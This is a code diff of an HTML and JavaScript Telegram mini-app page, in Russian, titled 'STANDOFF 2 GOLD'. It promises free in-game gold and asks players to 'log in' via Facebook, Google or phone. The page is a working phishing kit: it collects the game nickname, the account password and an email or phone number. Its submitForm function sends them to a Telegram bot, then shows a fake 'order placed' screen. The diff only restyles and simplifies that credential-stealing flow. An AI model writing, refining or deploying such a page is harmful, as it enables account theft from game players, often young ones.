@@ -12,70 +12,39 @@
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
-
         body {
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
             min-height: 100vh;
             color: white;
         }
-
         .container {
             max-width: 400px;
             margin: 0 auto;
             padding: 20px;
         }
-
         .header {
             text-align: center;
             margin-bottom: 30px;
-            animation: float 3s ease-in-out infinite;
         }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-
         .gold-icon {
             font-size: 80px;
             filter: drop-shadow(0 0 20px gold);
             margin-bottom: 10px;
         }
-
         h1 {
             font-size: 28px;
             background: linear-gradient(45deg, #ffd700, #ffa500);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 5px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
         }
-
-        .methods-screen {
-            display: block;
-        }
-
-        .form-screen {
-            display: none;
-        }
-
-        .success-screen {
-            display: none;
-            text-align: center;
-        }
-
         .methods-title {
             font-size: 18px;
             margin: 20px 0 15px;
             color: #a0a0a0;
-            text-transform: uppercase;
-            letter-spacing: 1px;
         }
-
         .method-card {
             background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 20px;
             padding: 20px;
@@ -86,13 +55,10 @@
             align-items: center;
             gap: 15px;
         }
-
         .method-card:hover {
             background: rgba(255, 255, 255, 0.1);
-            transform: translateX(5px);
             border-color: #ffd700;
         }
-
         .method-icon {
             width: 50px;
             height: 50px;
@@ -103,27 +69,22 @@
             justify-content: center;
             font-size: 30px;
         }
-
         .method-info {
             flex: 1;
         }
-
         .method-name {
             font-size: 18px;
             font-weight: 600;
             margin-bottom: 5px;
         }
-
         .method-desc {
             font-size: 12px;
             color: #a0a0a0;
         }
-
         .method-arrow {
             color: #ffd700;
             font-size: 20px;
         }
-
         .form-header {
             display: flex;
             align-items: center;
@@ -133,7 +94,6 @@
             padding: 15px;
             border-radius: 15px;
         }
-
         .back-button {
             background: rgba(255, 255, 255, 0.1);
             border: none;
@@ -143,43 +103,13 @@
             height: 40px;
             border-radius: 50%;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
-
-        .back-button:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .method-indicator {
-            flex: 1;
-            font-size: 18px;
-            font-weight: 600;
-        }
-
         .step-indicator {
             display: flex;
             justify-content: space-between;
             margin-bottom: 30px;
-            position: relative;
         }
-
-        .step-indicator::before {
-            content: '';
-            position: absolute;
-            top: 15px;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: rgba(255, 255, 255, 0.1);
-            z-index: 1;
-        }
-
         .step {
-            position: relative;
-            z-index: 2;
-            background: #1a1a2e;
             width: 40px;
             height: 40px;
             border-radius: 50%;
@@ -189,40 +119,28 @@
             border: 2px solid rgba(255, 255, 255, 0.2);
             font-weight: bold;
         }
-
         .step.active {
             border-color: #ffd700;
-            background: rgba(255, 215, 0, 0.2);
             color: #ffd700;
         }
-
         .step.completed {
             border-color: #4caf50;
-            background: rgba(76, 175, 80, 0.2);
             color: #4caf50;
         }
-
         .step-label {
-            position: absolute;
-            top: 45px;
-            left: 50%;
-            transform: translateX(-50%);
             font-size: 10px;
-            white-space: nowrap;
+            margin-top: 5px;
+            text-align: center;
             color: #a0a0a0;
         }
-
         .form-group {
             margin-bottom: 25px;
         }
-
         .form-label {
             display: block;
             margin-bottom: 8px;
             color: #a0a0a0;
-            font-size: 14px;
         }
-
         .form-input {
             width: 100%;
             padding: 15px;
@@ -231,19 +149,11 @@
             border-radius: 12px;
             color: white;
             font-size: 16px;
-            transition: all 0.3s;
         }
-
         .form-input:focus {
             outline: none;
             border-color: #ffd700;
-            background: rgba(255, 255, 255, 0.1);
         }
-
-        .form-input::placeholder {
-            color: rgba(255, 255, 255, 0.3);
-        }
-
         .next-button {
             width: 100%;
             padding: 18px;
@@ -254,50 +164,32 @@
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 20px;
         }
-
-        .next-button:hover {
-            transform: scale(0.98);
-            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
-        }
-
         .next-button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
-
         .info-text {
             text-align: center;
             margin-top: 20px;
             color: #a0a0a0;
             font-size: 12px;
         }
-
+        .methods-screen, .form-screen, .success-screen {
+            display: none;
+        }
+        .methods-screen.active, .form-screen.active, .success-screen.active {
+            display: block;
+        }
         .success-icon {
             font-size: 80px;
             margin: 40px 0 20px;
-            animation: bounce 1s;
         }
-
-        @keyframes bounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-        }
-
         .success-title {
             font-size: 24px;
             color: #ffd700;
             margin-bottom: 10px;
         }
-
-        .success-text {
-            color: #a0a0a0;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-
         .success-details {
             background: rgba(255, 255, 255, 0.05);
             border-radius: 15px;
@@ -305,7 +197,6 @@
             margin-bottom: 30px;
             text-align: left;
         }
-
         .detail-item {
             display: flex;
             justify-content: space-between;
@@ -313,22 +204,6 @@
             padding-bottom: 10px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
-
-        .detail-item:last-child {
-            border-bottom: none;
-            margin-bottom: 0;
-            padding-bottom: 0;
-        }
-
-        .detail-label {
-            color: #a0a0a0;
-        }
-
-        .detail-value {
-            color: #ffd700;
-            font-weight: 600;
-        }
-
         .close-button {
             width: 100%;
             padding: 18px;
@@ -345,23 +220,22 @@
 <body>
     <div class="container">
         <!-- Экран выбора метода -->
-        <div id="methodsScreen" class="methods-screen">
+        <div id="methodsScreen" class="methods-screen active">
             <div class="header">
                 <div class="gold-icon">🪙</div>
                 <h1>STANDOFF 2 GOLD</h1>
             </div>
-
             <div class="methods-title">ВОЙТИ ЧЕРЕЗ</div>
-
+            
             <div class="method-card" onclick="selectMethod('Facebook')">
                 <div class="method-icon">📘</div>
                 <div class="method-info">
                     <div class="method-name">Facebook</div>
-                    <div class="method-desc">Быстрый вход через аккаунт Facebook</div>
+                    <div class="method-desc">Вход через аккаунт Facebook</div>
                 </div>
                 <div class="method-arrow">→</div>
             </div>
-
+            
             <div class="method-card" onclick="selectMethod('Google')">
                 <div class="method-icon">🔵</div>
                 <div class="method-info">
@@ -370,7 +244,7 @@
                 </div>
                 <div class="method-arrow">→</div>
             </div>
-
+            
             <div class="method-card" onclick="selectMethod('Номер телефона')">
                 <div class="method-icon">📱</div>
                 <div class="method-info">
@@ -379,70 +253,52 @@
                 </div>
                 <div class="method-arrow">→</div>
             </div>
-
-            <div class="info-card" style="margin-top: 30px; background: rgba(0,0,0,0.3); border-radius: 15px; padding: 15px;">
-                <div style="display: flex; gap: 10px; color: #a0a0a0; font-size: 14px;">
-                    <span>ℹ️</span>
-                    <span>Выберите способ входа для получения голды</span>
-                </div>
-            </div>
         </div>
 
-        <!-- Экран формы ввода -->
+        <!-- Экран формы -->
         <div id="formScreen" class="form-screen">
             <div class="form-header">
                 <button class="back-button" onclick="backToMethods()">←</button>
                 <div class="method-indicator" id="selectedMethod">Facebook</div>
             </div>
-
-            <!-- Индикатор шагов -->
+            
             <div class="step-indicator">
-                <div class="step active" id="step1">1<span class="step-label">Никнейм</span></div>
-                <div class="step" id="step2">2<span class="step-label">Пароль</span></div>
-                <div class="step" id="step3">3<span class="step-label" id="step3Label">Данные</span></div>
+                <div class="step active" id="step1">1</div>
+                <div class="step" id="step2">2</div>
+                <div class="step" id="step3">3</div>
             </div>
-
-            <!-- Шаг 1: Никнейм (любые языки и цифры) -->
+            
+            <!-- Шаг 1 -->
             <div id="step1Content">
                 <div class="form-group">
                     <label class="form-label">🎮 Никнейм в Standoff 2</label>
                     <input type="text" class="form-input" id="nickname" 
-                           placeholder="Введите никнейм (любые символы)" 
-                           oninput="validateStep1()"
-                           pattern=".*"
-                           inputmode="text">
+                           placeholder="Введите никнейм" 
+                           oninput="checkStep1()">
                 </div>
-                <button class="next-button" id="nextBtn1" onclick="nextStep()" disabled>Продолжить</button>
+                <button class="next-button" id="nextBtn1" onclick="nextStep()" disabled>Далее</button>
             </div>
-
-            <!-- Шаг 2: Пароль (любые языки и цифры) -->
+            
+            <!-- Шаг 2 -->
             <div id="step2Content" style="display: none;">
                 <div class="form-group">
-                    <label class="form-label">🔐 Пароль от аккаунта</label>
+                    <label class="form-label">🔐 Пароль</label>
                     <input type="password" class="form-input" id="password" 
-                           placeholder="Введите пароль (любые символы)" 
-                           oninput="validateStep2()"
-                           pattern=".*"
-                           inputmode="text">
+                           placeholder="Введите пароль" 
+                           oninput="checkStep2()">
                 </div>
-                <button class="next-button" id="nextBtn2" onclick="nextStep()" disabled>Продолжить</button>
+                <button class="next-button" id="nextBtn2" onclick="nextStep()" disabled>Далее</button>
             </div>
-
-            <!-- Шаг 3: Дополнительные данные -->
+            
+            <!-- Шаг 3 -->
             <div id="step3Content" style="display: none;">
                 <div class="form-group">
-                    <label class="form-label" id="step3LabelField">📧 Email или телефон</label>
+                    <label class="form-label" id="step3Label">📧 Дополнительные данные</label>
                     <input type="text" class="form-input" id="additionalData" 
                            placeholder="" 
-                           oninput="validateStep3()"
-                           pattern=".*"
-                           inputmode="text">
+                           oninput="checkStep3()">
                 </div>
                 <button class="next-button" id="nextBtn3" onclick="submitForm()" disabled>Отправить</button>
-            </div>
-
-            <div class="info-text" id="formInfo">
-                Введите данные для входа в аккаунт
             </div>
         </div>
 
@@ -450,13 +306,7 @@
         <div id="successScreen" class="success-screen">
             <div class="success-icon">✅</div>
             <div class="success-title">ЗАКАЗ ОФОРМЛЕН!</div>
-            <div class="success-text">
-                🪙 Ваша голда поступит в течение 2 дней<br>
-                на ваш аккаунт
-            </div>
-            <div class="success-details" id="successDetails">
-                <!-- Данные будут вставлены через JS -->
-            </div>
+            <div class="success-details" id="successDetails"></div>
             <button class="close-button" onclick="closeApp()">Закрыть</button>
         </div>
     </div>
@@ -473,112 +323,78 @@
             additionalData: ''
         };
 
-        // Функция выбора метода
         function selectMethod(method) {
             currentMethod = method;
             document.getElementById('selectedMethod').textContent = method;
             
-            // Меняем подпись для третьего шага в зависимости от метода
             let step3Label = document.getElementById('step3Label');
-            let step3LabelField = document.getElementById('step3LabelField');
             let additionalInput = document.getElementById('additionalData');
             
             if (method === 'Facebook') {
-                step3Label.textContent = 'Email/Phone';
-                step3LabelField.textContent = '📧 Email или номер телефона Facebook';
+                step3Label.textContent = '📧 Email или телефон Facebook';
                 additionalInput.placeholder = 'Введите email или телефон';
             } else if (method === 'Google') {
-                step3Label.textContent = 'Gmail';
-                step3LabelField.textContent = '✉️ Google email';
-                additionalInput.placeholder = 'Введите Gmail';
-            } else if (method === 'Номер телефона') {
-                step3Label.textContent = 'Телефон';
-                step3LabelField.textContent = '☎️ Номер телефона';
-                additionalInput.placeholder = ''; // Пустой placeholder для номера телефона
+                step3Label.textContent = '✉️ Google email';
+                additionalInput.placeholder = 'example@gmail.com';
+            } else {
+                step3Label.textContent = '☎️ Номер телефона';
+                additionalInput.placeholder = '';
             }
             
-            // Показываем экран формы
-            document.getElementById('methodsScreen').style.display = 'none';
-            document.getElementById('formScreen').style.display = 'block';
-            
-            // Сбрасываем шаги
+            document.querySelector('.methods-screen').classList.remove('active');
+            document.querySelector('.form-screen').classList.add('active');
             resetForm();
         }
 
-        // Возврат к выбору метода
         function backToMethods() {
-            document.getElementById('methodsScreen').style.display = 'block';
-            document.getElementById('formScreen').style.display = 'none';
-            document.getElementById('successScreen').style.display = 'none';
+            document.querySelector('.form-screen').classList.remove('active');
+            document.querySelector('.methods-screen').classList.add('active');
             resetForm();
         }
 
-        // Сброс формы
         function resetForm() {
-            // Показываем первый шаг
             document.getElementById('step1Content').style.display = 'block';
             document.getElementById('step2Content').style.display = 'none';
             document.getElementById('step3Content').style.display = 'none';
             
-            // Сбрасываем индикаторы
             document.getElementById('step1').className = 'step active';
             document.getElementById('step2').className = 'step';
             document.getElementById('step3').className = 'step';
             
-            // Очищаем поля
             document.getElementById('nickname').value = '';
             document.getElementById('password').value = '';
             document.getElementById('additionalData').value = '';
             
-            // Сбрасываем кнопки
             document.getElementById('nextBtn1').disabled = true;
             document.getElementById('nextBtn2').disabled = true;
             document.getElementById('nextBtn3').disabled = true;
-            
-            // Сбрасываем данные
-            userData = { nickname: '', password: '', additionalData: '' };
-            
-            document.getElementById('formInfo').textContent = 'Введите данные для входа в аккаунт';
         }
 
-        // Валидация шага 1 (любые символы, минимум 1)
-        function validateStep1() {
-            const nickname = document.getElementById('nickname').value;
-            document.getElementById('nextBtn1').disabled = nickname.length < 1;
+        function checkStep1() {
+            let value = document.getElementById('nickname').value;
+            document.getElementById('nextBtn1').disabled = value.length < 1;
         }
 
-        // Валидация шага 2 (любые символы, минимум 1)
-        function validateStep2() {
-            const password = document.getElementById('password').value;
-            document.getElementById('nextBtn2').disabled = password.length < 1;
+        function checkStep2() {
+            let value = document.getElementById('password').value;
+            document.getElementById('nextBtn2').disabled = value.length < 1;
         }
 
-        // Валидация шага 3
-        function validateStep3() {
-            const additional = document.getElementById('additionalData').value;
+        function checkStep3() {
+            let value = document.getElementById('additionalData').value;
             let isValid = false;
             
             if (currentMethod === 'Google') {
-                isValid = additional.includes('@') && additional.length > 5;
-            } else if (currentMethod === 'Номер телефона') {
-                isValid = additional.length >= 5; // Минимальная длина для номера
+                isValid = value.includes('@');
             } else {
-                isValid = additional.length >= 1;
+                isValid = value.length >= 1;
             }
             
             document.getElementById('nextBtn3').disabled = !isValid;
-            
-            if (currentMethod === 'Google' && !isValid && additional.length > 0) {
-                document.getElementById('formInfo').textContent = 'Email должен содержать @';
-            } else {
-                document.getElementById('formInfo').textContent = 'Введите данные для входа в аккаунт';
-            }
         }
 
-        // Переход к следующему шагу
         function nextStep() {
             if (document.getElementById('step1Content').style.display !== 'none') {
-                // Шаг 1 -> Шаг 2
                 userData.nickname = document.getElementById('nickname').value;
                 
                 document.getElementById('step1Content').style.display = 'none';
@@ -587,10 +403,7 @@
                 document.getElementById('step1').className = 'step completed';
                 document.getElementById('step2').className = 'step active';
                 
-                document.getElementById('formInfo').textContent = 'Введите пароль от аккаунта';
-                
             } else if (document.getElementById('step2Content').style.display !== 'none') {
-                // Шаг 2 -> Шаг 3
                 userData.password = document.getElementById('password').value;
                 
                 document.getElementById('step2Content').style.display = 'none';
@@ -598,45 +411,11 @@
                 
                 document.getElementById('step2').className = 'step completed';
                 document.getElementById('step3').className = 'step active';
-                
-                let stepText = '';
-                if (currentMethod === 'Facebook') stepText = 'Введите email или телефон Facebook';
-                else if (currentMethod === 'Google') stepText = 'Введите Gmail';
-                else stepText = 'Введите номер телефона';
-                
-                document.getElementById('formInfo').textContent = stepText;
             }
         }
 
-        // Отправка формы
         function submitForm() {
             userData.additionalData = document.getElementById('additionalData').value;
-            
-            // Показываем экран успеха
-            document.getElementById('formScreen').style.display = 'none';
-            document.getElementById('successScreen').style.display = 'block';
-            
-            // Заполняем детали
-            const detailsHtml = `
-                <div class="detail-item">
-                    <span class="detail-label">Метод входа:</span>
-                    <span class="detail-value">${currentMethod}</span>
-                </div>
-                <div class="detail-item">
-                    <span class="detail-label">Никнейм:</span>
-                    <span class="detail-value">${userData.nickname}</span>
-                </div>
-                <div class="detail-item">
-                    <span class="detail-label">Пароль:</span>
-                    <span class="detail-value">${'•'.repeat(Math.min(userData.password.length, 10))}</span>
-                </div>
-                <div class="detail-item">
-                    <span class="detail-label">Доп. данные:</span>
-                    <span class="detail-value">${userData.additionalData}</span>
-                </div>
-            `;
-            
-            document.getElementById('successDetails').innerHTML = detailsHtml;
             
             // Отправляем данные в бота
             tg.sendData(JSON.stringify({
@@ -647,19 +426,24 @@
                 additionalData: userData.additionalData
             }));
             
-            // Вибрация
+            // Показываем экран успеха
+            document.querySelector('.form-screen').classList.remove('active');
+            document.querySelector('.success-screen').classList.add('active');
+            
+            // Показываем данные
+            document.getElementById('successDetails').innerHTML = `
+                <div class="detail-item">Метод входа: ${currentMethod}</div>
+                <div class="detail-item">Никнейм: ${userData.nickname}</div>
+                <div class="detail-item">Пароль: ${'•'.repeat(userData.password.length)}</div>
+                <div class="detail-item">Данные: ${userData.additionalData}</div>
+            `;
+            
             tg.HapticFeedback.notificationOccurred('success');
         }
 
-        // Закрытие приложения
         function closeApp() {
             tg.close();
         }
-
-        // Обработка данных из бота
-        tg.onEvent('mainButtonClicked', function() {
-            tg.sendData(JSON.stringify({action: 'main_button_clicked'}));
-        });
     </script>
 </body>
 </html>
